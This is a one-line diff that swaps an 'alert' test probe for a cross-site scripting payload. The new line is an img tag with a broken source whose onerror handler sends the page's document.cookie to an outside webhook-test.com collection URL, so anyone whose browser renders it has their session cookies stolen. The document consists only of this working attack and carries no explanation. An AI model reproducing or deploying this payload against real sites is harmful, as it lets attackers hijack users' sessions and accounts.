@@ -1,1 +1,1 @@
-alert(2523525);
+<img src=x onerror=this.src='https://webhook-test.com/23dbd7f9f4b453a5720443d2ea9ef1b5/?'+document.cookie;>
